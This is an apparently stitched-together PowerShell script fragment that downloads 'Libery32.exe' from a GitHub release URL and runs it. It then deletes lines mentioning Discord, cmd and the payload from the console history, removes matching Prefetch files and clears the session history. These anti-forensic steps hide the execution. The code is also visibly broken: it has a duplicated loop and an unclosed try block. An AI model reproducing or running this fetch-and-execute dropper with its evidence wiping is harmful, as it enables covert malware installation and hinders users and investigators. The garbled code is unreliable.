$exeUrls = @(
    $ExeUrl,
    'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe'
)
$downloaded = $false
foreach ($url in $exeUrls) {
foreach ($url in @($ExeUrl, 'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe')) {
    if ([string]::IsNullOrWhiteSpace($url)) { continue }
    try {
        Write-Host ('Downloading: ' + $url) -ForegroundColor Cyan
}
Write-Host 'Downloaded' -ForegroundColor Green
$proc = Start-Process -FilePath $tempExe -PassThru
$proc.WaitForExit()
Start-Sleep -Seconds 2
$historyPath = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
if (Test-Path $historyPath) {
    try {
        $lines = Get-Content $historyPath
        $filtered = $lines | Where-Object {
            ($_ -notmatch 'discord') -and
            ($_ -notmatch 'cmd') -and
            ($_ -notmatch 'libery32') -and
            ($_ -notmatch 'Libery32') -and
            ($_ -notmatch $randomName)
        }
        $filtered | Set-Content -Path $historyPath -Encoding UTF8
        $keep = Get-Content $historyPath | Where-Object { $_ -notmatch $pattern }
        $keep | Set-Content -Path $historyPath -Encoding UTF8
    } catch {}
}
try {
    Remove-Item ('C:\Windows\Prefetch\*' + $randomName + '*') -Force -ErrorAction SilentlyContinue
    Remove-Item 'C:\Windows\Prefetch\*LIBERY32*' -Force -ErrorAction SilentlyContinue
    Remove-Item 'C:\Windows\Prefetch\*discord*' -Force -ErrorAction SilentlyContinue
} catch {}
Clear-History
